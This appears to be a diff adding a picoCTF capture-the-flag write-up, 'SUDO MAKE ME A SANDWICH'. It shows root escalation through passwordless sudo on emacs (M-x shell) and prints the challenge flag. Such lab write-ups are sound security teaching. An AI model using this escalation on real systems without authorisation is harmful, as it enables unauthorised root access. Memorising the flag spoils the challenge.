@@ -1,0 +1,59 @@
+---
+tags: [linux]
+---
+# SUDO MAKE ME A SANDWICH
+
+- **Description:** Can you read the flag? I think you can!
+
+## 🔎 Solution
+After connecting to the system, listing the files reveals the presence of a `flag.txt` file. 
+However, only the `root` user has permission to read it:
+```
+ctf-player@challenge:~$ ls -la
+total 16
+drwxr-xr-x 1 ctf-player ctf-player   20 Mar 17 07:23 .
+drwxr-xr-x 1 root       root         24 Mar  9 21:32 ..
+-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
+drwx------ 2 ctf-player ctf-player   34 Mar 17 07:23 .cache
+-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
+//highlight-next-line
+-r--r----- 1 root       root         31 Mar  9 21:32 flag.txt
+```
+
+At this point, we are operating as `ctf-player`. 
+To check the available sudo privileges, we run `sudo -l`. 
+The output shows that this user is allowed to execute `/bin/emacs` as root without requiring a password:
+```
+ctf-player@challenge:~$ sudo -l
+Matching Defaults entries for ctf-player on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+//highlight-start
+User ctf-player may run the following commands on challenge:
+    (ALL) NOPASSWD: /bin/emacs
+//highlight-end
+```
+
+**Emacs** is not just a text editor - it is capable of spawning shells, executing system commands, and even opening a terminal. 
+This makes it a perfect target for privilege escalation.
+
+We can simply launch it with elevated privileges:
+```
+sudo emacs
+```
+
+Once inside Emacs, press `Alt + x` (or `M-x`), then type `shell`. This spawns a shell running as root:
+```
+root@challenge:/home/ctf-player# ls
+flag.txt
+```
+
+Now we can read the flag:
+```
+picoCTF{ju57_5ud0_17_4c6f730f}
+```
+
+## 🚩 Flag
+> `picoCTF{ju57_5ud0_17_4c6f730f}`
+
